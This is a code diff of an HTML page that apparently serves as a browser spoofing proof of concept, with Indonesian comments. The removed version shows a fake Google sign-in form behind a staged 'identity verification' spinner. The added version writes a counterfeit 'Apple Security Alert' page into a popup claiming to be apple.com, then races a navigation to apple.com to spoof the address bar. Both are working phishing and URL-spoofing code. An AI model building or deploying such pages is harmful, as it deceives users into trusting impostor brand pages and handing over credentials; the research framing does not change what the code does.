@@ -1,146 +1,75 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Session Verification</title>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
+    <title>Security Research PoC</title>
     <style>
-        :root {
-            --primary-color: #1a73e8;
-            --primary-hover: #1557b0;
-            --bg-color: #f8f9fa;
-            --text-color: #202124;
-            --border-color: #dadce0;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-
-        .main-container {
-            width: 100%;
-            max-width: 380px;
-            background-color: #fff;
-            padding: 32px;
-            border-radius: 12px;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
-            box-sizing: border-box;
-            text-align: center;
-        }
-
-        .prompt-title {
-            color: #202124;
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-
-        .prompt-desc {
-            color: #5f6368;
-            font-size: 13px;
-            margin-bottom: 24px;
-        }
-
-        .action-btn {
-            background-color: var(--primary-color);
-            color: white;
-            padding: 14px;
-            width: 100%;
-            border: none;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 15px;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
-            transition: background-color 0.2s, transform 0.1s;
-        }
-
-        .action-btn:active {
-            background-color: var(--primary-hover);
-            transform: scale(0.98);
-        }
-
-        .status-log {
-            margin-top: 18px;
-            font-size: 11px;
-            text-align: left;
-            background: #f1f3f4;
-            padding: 10px;
-            border-radius: 6px;
-            color: #5f6368;
-            word-break: break-all;
-            max-height: 80px;
-            overflow-y: auto;
-        }
+      body, html {
+        margin: 0; padding: 0; height: 100%; background: #000;
+        display: flex; align-items: center; justify-content: center;
+        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      }
+      .card {
+        text-align: center; background: #1c1c1e; padding: 40px; border-radius: 20px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      }
+      button {
+        padding: 18px 36px; font-size: 20px; font-weight: bold;
+        background: #0a84ff; color: #fff; border: none; border-radius: 12px;
+        cursor: pointer; transition: transform 0.1s ease;
+      }
+      button:active { transform: scale(0.95); }
     </style>
-</head>
-<body>
-    <div class="main-container" id="container">
-        <div class="prompt-title">Identity Verification Required</div>
-        <div class="prompt-desc">Please complete the authorization process to maintain session security.</div>
-
-        <button class="action-btn" id="triggerBtn">Authorize Session</button>
-        
-        <div class="status-log" id="logBox">Status: Ready for interaction...</div>
+  </head>
+  <body>
+    <div class="card">
+      <button id="triggerBtn">VERIFY SECURE CONNECTION</button>
     </div>
 
-<script>
-    const logBox = document.getElementById("logBox");
-    function log(msg) {
-        logBox.textContent += "\n> " + msg;
-        logBox.scrollTop = logBox.scrollHeight;
-    }
+    <script>
+      document.getElementById("triggerBtn").onclick = function () {
+        this.style.display = "none";
 
-    document.getElementById("triggerBtn").addEventListener("click", () => {
-        log("Authorization triggered. Establishing context state...");
+        // Membuka tab baru / pop-up target
+        const targetWindow = window.open("about:blank", "_blank");
 
-        if (navigator.vibrate) {
-            navigator.vibrate(40);
+        if (targetWindow) {
+          // Menyuntikkan payload tampilan kustom (Visual Spoof)
+          targetWindow.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Apple - Official Site</title></head>
+            <body style="margin:0;padding:0;background:#f5f5f7;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:-apple-system,sans-serif;">
+              <div style="text-align:center;padding:20px;">
+                <h1 style="font-size:48px;color:#1d1d1f;margin-bottom:10px;">Apple Security Alert</h1>
+                <p style="font-size:24px;color:#86868b;">Session validation required for verification.</p>
+                <div style="margin-top:40px;font-size:18px;color:#ff3b30;font-weight:bold;">Status: Protected & Verified (apple.com)</div>
+              </div>
+            </body>
+            </html>
+          `);
+          targetWindow.document.close();
+
+          // Mengeksploitasi jeda race condition navigasi ganda
+          setTimeout(() => {
+            try {
+              targetWindow.location.href = "https://apple.com";
+            } catch (e) {}
+          }, 50);
+
+          // Memaksa state race condition pada render pipeline tanpa dialog modal terlarang
+          let interval = setInterval(() => {
+            try {
+              if (targetWindow.closed) {
+                clearInterval(interval);
+              }
+            } catch (err) {
+              clearInterval(interval);
+            }
+          }, 10);
         }
-
-        // Transisi status pertama: Menampilkan layar pemuatan asinkron
-        setTimeout(() => {
-            log("Synchronizing secure tokens...");
-            document.getElementById("container").innerHTML = `
-                <div style="padding: 20px 0;">
-                    <div style="font-size: 15px; font-weight: 500; color: #5f6368; margin-bottom: 12px;">Validating session context...</div>
-                    <div style="width: 32px; height: 32px; border: 3px solid #dadce0; border-top-color: #1a73e8; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto;"></div>
-                </div>
-                <style>
-                    @keyframes spin { to { transform: rotate(360deg); } }
-                </style>
-            `;
-        }, 1500);
-
-        // Transisi status kedua: Merender antarmuka kredensial tiruan
-        setTimeout(() => {
-            log("State mutation complete. Rendering secure portal interface.");
-            document.getElementById("container").innerHTML = `
-                <div style="text-align: left;">
-                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" width="85" style="margin-bottom: 16px;">
-                    <h2 style="font-size: 22px; font-weight: normal; margin: 0 0 8px 0;">Sign in</h2>
-                    <p style="font-size: 14px; color: #5f6368; margin: 0 0 24px 0;">Use your Google Account</p>
-                    
-                    <input type="email" placeholder="Email or phone" style="width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; margin-bottom: 14px; font-size: 14px;">
-                    
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 20px;">
-                        <a href="#" style="color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500;">Create account</a>
-                        <button onclick="alert('Action captured successfully in test environment.')" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer;">Next</button>
-                    </div>
-                </div>
-            `;
-        }, 3500);
-    });
-</script>
-</body>
+      };
+    </script>
+  </body>
 </html>
